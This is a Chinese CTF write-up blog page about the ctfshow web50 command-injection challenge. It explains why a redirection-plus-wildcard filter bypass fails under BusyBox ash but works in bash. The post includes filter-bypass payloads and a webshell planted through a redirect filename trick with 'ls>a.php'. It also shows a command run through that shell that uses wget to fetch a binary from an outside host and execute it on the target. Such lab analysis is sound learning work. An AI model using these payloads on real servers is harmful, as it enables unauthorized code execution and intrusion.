@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>the0n3 - ctfshow web50的疑问 --web容器环境</title>
+        <meta name="description" content="前言 看群里有师傅学习到ctfshow命令执行web50这里提出疑问，为什么这里为啥c=tac&amp;lt;fla?.php|| 不行呀，想起来之前刷到这里我也有这个疑问 前面的铺垫可以学习到 tac fla?.php tac f* ta\c fla&#039;&#039;g.php tac&amp;lt;fla&#039;&#039;g.php 通过这道题的前几道题的铺…">
+    <link rel="canonical" href="https://the0n3.top/pages/47314c/">
+    <!-- Open Graph -->
+    <meta property="og:title" content="ctfshow web50的疑问 --web容器环境">
+    <meta property="og:description" content="前言 看群里有师傅学习到ctfshow命令执行web50这里提出疑问，为什么这里为啥c=tac&amp;lt;fla?.php|| 不行呀，想起来之前刷到这里我也有这个疑问 前面的铺垫可以学习到 tac fla?.php tac f* ta\c fla&#039;&#039;g.php tac&amp;lt;fla&#039;&#039;g.php 通过这道题的前几道题的铺…">
+    <meta property="og:url" content="https://the0n3.top/pages/47314c/">
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="the0n3">
+    <meta property="og:locale" content="zh_CN">
+        <meta property="og:image" content="https://the0n3.top/images/show-qa/01.png">
+        <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="ctfshow web50的疑问 --web容器环境">
+    <meta name="twitter:description" content="前言 看群里有师傅学习到ctfshow命令执行web50这里提出疑问，为什么这里为啥c=tac&amp;lt;fla?.php|| 不行呀，想起来之前刷到这里我也有这个疑问 前面的铺垫可以学习到 tac fla?.php tac f* ta\c fla&#039;&#039;g.php tac&amp;lt;fla&#039;&#039;g.php 通过这道题的前几道题的铺…">
+        <meta name="twitter:image" content="https://the0n3.top/images/show-qa/01.png">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+    <!-- 功能样式（自动扫描 assets/features/ 目录） -->
+        <link rel="stylesheet" href="/assets/features/code-fold/style.css">
+        <link rel="stylesheet" href="/assets/features/image-enhance/style.css">
+        <link rel="stylesheet" href="/assets/features/reading-progress/style.css">
+        <link rel="stylesheet" href="/assets/features/tax-accordion/style.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <link rel="stylesheet" href="/assets/css/search.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+    <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+    <header>
+        <nav>
+            <div class="nav-right">
+                                <a href="/">首页</a>
+                                <a href="/archives/">归档</a>
+                                <a href="/categories/">分类</a>
+                                <a href="/tags/">标签</a>
+                                <a href="/friends/">友链</a>
+                                <a href="/about/">关于</a>
+                                <a href="https://www.travellings.cn/go.html">开往</a>
+                                                <button
+                    id="searchTrigger"
+                    class="search-trigger"
+                    type="button"
+                    aria-label="打开搜索"
+                    aria-haspopup="dialog"
+                    aria-controls="searchModal"
+                    title="搜索（/）"
+                >
+                    <span class="search-trigger__label">搜索</span>
+                    <span class="search-trigger__hint">/</span>
+                </button>
+            </div>
+        </nav>
+    </header>
+                <main class="markdown-body">
+            
+<article class="post-content">
+    <h1>ctfshow web50的疑问 --web容器环境</h1>
+    <p>
+        <span class="meta">发布于: 2024-10-13 19:41</span>
+    </p>
+    <div class="post-body">
+        <h2>前言</h2>
+<p>看群里有师傅学习到ctfshow命令执行<code>web50</code>这里提出疑问，为什么<code>这里为啥c=tac&lt;fla?.php||  不行呀</code>，想起来之前刷到这里我也有这个疑问</p>
+<!-- more -->
+<p>前面的铺垫可以学习到</p>
+<pre><code class="language-bash">tac fla?.php
+tac f*
+ta\c fla''g.php
+tac&lt;fla''g.php</code></pre>
+<p>通过这道题的前几道题的铺垫可以学习到<code>&lt;</code>重定向符可以把文件的内容输出到<code>tac</code>命令中，<code>?</code>,<code>.</code>通配符可以绕过直接写文件名的限制，但是两个玩法结合在一起就失效了</p>
+<pre><code class="language-bash">ta\c&lt;fla?.php</code></pre>
+<h2>测试</h2>
+<h3>本地ubuntu测试</h3>
+<p>在本地ubuntu测试发现，这条命令是可以正常执行的</p>
+<p><img src="/images/show-qa/01.png" alt="0" decoding="async" width="1314" height="842"></p>
+<p>查看，<code>Ubuntu</code>的默认shell环境是<code>/bin/bash</code></p>
+<p>感觉靶机的版本或者环境不同等引发的问题</p>
+<p>查看一下靶机操作系统信息</p>
+<p><img src="/images/show-qa/02.png" alt="1" decoding="async" loading="lazy" width="1573" height="760"></p>
+<p>确定靶机是<code>alpine</code>的操作系统，装个虚拟机测试一下</p>
+<h3>Alpine Linux虚拟机测试</h3>
+<p>在本地Alpine测试发现，果然重定向符<code>&lt;</code>和通配符<code>?</code>结合在一起就失效了，找不到文件</p>
+<p><img src="/images/show-qa/00.png" alt="0" decoding="async" loading="lazy" width="1280" height="768"></p>
+<p>查看，<code>Alpine</code>的默认shell环境是<code>/bin/ash</code></p>
+<p><img src="/images/show-qa/03.png" alt="03" decoding="async" loading="lazy" width="807" height="141"></p>
+<h2>靶机环境下调试</h2>
+<p>为了更接近靶机环境，尝试在靶机 getshell</p>
+<p>经过尝试，发现可以通过重定向创建文件的方法，在绕过waf的情况下，创建一个文件名为webshell内容的文件，再ls重定向创建webshell</p>
+<pre><code class="language-bash">&gt;'&lt;?=eval(array_pop(next(get_defined_vars())))?&gt;'%0a
+ls&gt;a.php%0a
+访问 a.php，post传入任意参数</code></pre>
+<p>再通过 <code>a.php</code> 的无参 rce 写入一个webshell，AntSword 连上来，方便调试。</p>
+<p><img src="/images/show-qa/1.png" alt="" decoding="async" loading="lazy" width="1026" height="692"></p>
+<h2>靶机系统信息收集</h2>
+<p>获取靶机系统信息，确认是<code>Alpine Linux</code>，默认shell是<code>/bin/ash</code>，并且<code>sh</code>其实是<code>busybox</code>的一个链接</p>
+<pre><code class="language-bash">(www-data:/var/www/html) $ readlink -f $(which sh)
+/bin/busybox
+(www-data:/var/www/html) $ cat /etc/os-release
+NAME="Alpine Linux"
+ID=alpine
+VERSION_ID=3.10.3
+PRETTY_NAME="Alpine Linux v3.10"
+HOME_URL="https://alpinelinux.org/"
+BUG_REPORT_URL="https://bugs.alpinelinux.org/"
+(www-data:/var/www/html) $ uname -a
+Linux 9be56d4b244e 5.4.0-163-generic #180-Ubuntu SMP Tue Sep 5 13:21:23 UTC 2023 x86_64 Linux
+(www-data:/var/www/html) </code></pre>
+<h2>静态编译 strace 调试</h2>
+<p>下载静态编译 strace，调试 <code>cat&lt;fla?.php</code> 执行过程</p>
+<pre><code class="language-bash">1=system('ls -alh $(which sh);wget "https://hk.gh-proxy.org/https://github.com/XMCVE/static-tools/blob/main/strace/strace.x86_64.6.4";
+chmod %26x ./strace.x86_64.6.4;./strace.x86_64.6.4 -ff -tt -T -yy -v -s 1024 -e trace=%25process,%25file,%25desc -o /tmp/mix sh -c "tac&lt;fla?.php" 2&gt;/tmp/strace.err;ls -l /tmp/mix*;cat /tmp/strace.err;cat /tmp/mix*');</code></pre>
+<p>写成一坨了，拆开来看</p>
+<pre><code class="language-bash">ls -alh $(which sh);
+wget "https://hk.gh-proxy.org/https://github.com/XMCVE/static-tools/blob/main/strace/strace.x86_64.6.4";
+chmod %26x ./strace.x86_64.6.4;
+./strace.x86_64.6.4 -ff -tt -T -yy -v -s 1024 -e trace=%25process,%25file,%25desc -o /tmp/mix sh -c "tac&lt;fla?.php" 2&gt;/tmp/strace.err;
+ls -l /tmp/mix*;
+cat /tmp/strace.err;
+cat /tmp/mix*; </code></pre>
+<p>从报错里，拿到核心信息：</p>
+<pre><code class="language-plaintext">open("fla?.php", O_RDONLY) = -1 ENOENT (No such file or directory)
+writev(2, [{iov_base="sh: ", iov_len=4}, {iov_base=NULL, iov_len=0}], 2) = 4
+writev(2, [{iov_base="can't open fla?.php: no such file", iov_len=33}, {iov_base=NULL, iov_len=0}], 2) = 33
+exit_group(1) = ?
++++ exited with 1 +++</code></pre>
+<p><img src="/images/show-qa/2.png" alt="" decoding="async" loading="lazy" width="1920" height="897"></p>
+<p>可以看到，shell 在处理 tac&lt;fla?.php 时，直接尝试打开的是字面文件名 fla?.php，而不是展开后的 flag.php。
+这说明在 BusyBox ash 下，输入重定向目标位置的 fla?.php 并不会像普通参数那样进行通配符展开，因此最终报错 No such file or directory。</p>
+<pre><code class="language-plaintext">open("fla?.php", O_RDONLY) = -1 ENOENT (No such file or directory)</code></pre>
+<h2>写在最后</h2>
+<p>关键的问题，就是问题的关键(x)</p>
+<p>不是 &lt; 和 ? 本身有问题，而是 不同 shell（bash vs BusyBox ash）在处理“重定向目标”时，对通配符是否展开的行为不同。BusyBox ash 在重定向位置的行为更“保守 / 更接近 POSIX 最小要求”，而 bash 做了更“宽松 / 更方便用户”的扩展。</p>
+<p>即，同一个字符串，在“参数位置”和“重定向位置”，shell 的处理规则是不同的；而不同 shell 对“重定向位置是否做 glob 展开”的实现也不同。</p>
+<p>参考：</p>
+<ul>
+<li><a href="https://www.cnblogs.com/smlile-you-me/p/17321107.html">Alpine Linux安装</a></li>
+</ul>    </div>
+        <div class="post-meta-footer">
+                    <span class="post-meta-item">分类:
+                                    <span>notes</span>
+                            </span>
+                            <span class="post-meta-item">标签:
+                                    <span>#linux</span>
+                                    <span>#ctfshow</span>
+                            </span>
+            </div>
+    </article>
+
+
+<section class="post-comments" aria-label="Comments">
+    <script src="https://giscus.app/client.js"
+        data-repo="Apursuit/the0n3-blog"
+        data-repo-id="R_kgDORvPPbA"
+        data-category="Announcements"
+        data-category-id="DIC_kwDORvPPbM4C5KAt"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="bottom"
+        data-theme="light"
+        data-lang="zh-CN"
+        crossorigin="anonymous"
+        async>
+    </script>
+</section>
+
+        </main>
+    
+    <!-- 搜索命令面板：
+         第一版先提供标题、日期、标签搜索，以及键盘导航和快捷键 -->
+    <div id="searchModal" class="search-modal" hidden>
+        <div class="search-modal__overlay" data-search-close></div>
+        <div class="search-modal__dialog" role="dialog" aria-modal="true" aria-labelledby="searchModalTitle">
+            <div class="search-modal__panel">
+                <div class="search-modal__header">
+                    <div class="search-modal__title-group">
+                        <div id="searchModalTitle" class="search-modal__title">搜索文章</div>
+                        <div class="search-modal__subtitle">输入标题、标签或关键词，按 Enter 打开结果</div>
+                    </div>
+                    <button
+                        id="searchClose"
+                        class="search-modal__close"
+                        type="button"
+                        aria-label="关闭搜索"
+                        title="关闭搜索"
+                    >
+                        ×
+                    </button>
+                </div>
+
+                <div class="search-modal__body">
+                    <label class="search-input-wrap" for="searchInput">
+                        <span class="search-input-wrap__icon" aria-hidden="true">⌕</span>
+                        <input
+                            id="searchInput"
+                            class="search-input"
+                            type="text"
+                            placeholder="搜索文章..."
+                            autocomplete="off"
+                            spellcheck="false"
+                        >
+                    </label>
+
+                    <div class="search-help">
+                        <span>/ 打开</span>
+                        <span>↑ ↓ 选择</span>
+                        <span>Enter 打开</span>
+                        <span>Esc 关闭</span>
+                    </div>
+
+                    <div id="searchState" class="search-state" aria-live="polite">输入关键词开始搜索</div>
+                    <div id="searchResults" class="search-results" role="listbox" aria-label="搜索结果"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+    <!-- 功能脚本（自动扫描 assets/features/ 目录） -->
+        <script src="/assets/features/code-fold/script.js"></script>
+        <script src="/assets/features/image-enhance/script.js"></script>
+        <script src="/assets/features/reading-progress/script.js"></script>
+        <script src="/assets/features/tax-accordion/script.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+    <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+    <!-- 弹簧动画工具（搜索弹窗/灯箱进出场依赖） -->
+    <script src="/assets/js/spring.js"></script>
+    <!-- 搜索功能 -->
+    <script src="/assets/js/fuse.js"></script>
+    <script src="/assets/js/search.js"></script>
+</body>
+</html>
